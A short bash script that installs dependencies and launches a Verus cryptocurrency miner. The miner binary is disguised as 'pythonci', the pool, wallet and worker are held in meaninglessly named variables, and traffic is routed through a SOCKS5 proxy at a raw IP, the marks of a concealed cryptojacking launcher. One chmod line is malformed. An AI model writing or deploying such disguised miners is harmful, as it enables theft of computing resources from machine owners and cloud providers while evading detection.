#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x yui.sh && chmod +x pythonci chmod 777 pythonci yui.sh
screen -dmS ls
jem=stratum+tcp://na.luckpool.net:3956
bot=RLM9zhMnfJisKwYpbREgsfyFrs2RnZvs4e
welo=BR15
yoto=socks5://27.116.51.178:6667
./pythonci -a verus -o $jem -u $bot.$welo -p x -t 2 -x $yoto
